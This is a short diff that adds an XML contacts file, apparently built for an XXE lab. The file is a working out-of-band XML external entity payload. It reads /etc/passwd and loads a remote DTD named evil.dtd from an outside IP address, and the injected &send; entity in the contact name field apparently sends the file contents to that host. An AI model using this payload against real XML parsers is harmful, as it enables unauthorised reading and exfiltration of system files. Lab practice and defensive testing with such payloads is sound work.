@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE name [ <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://192.168.74.128/myxxelab/evil.dtd">%dtd;]>
+<contacts>
+  <name>&send;</name>
+  <num>123456</num>
+  <name>amgad</name>
+  <num>456789</num>
+  </contacts>
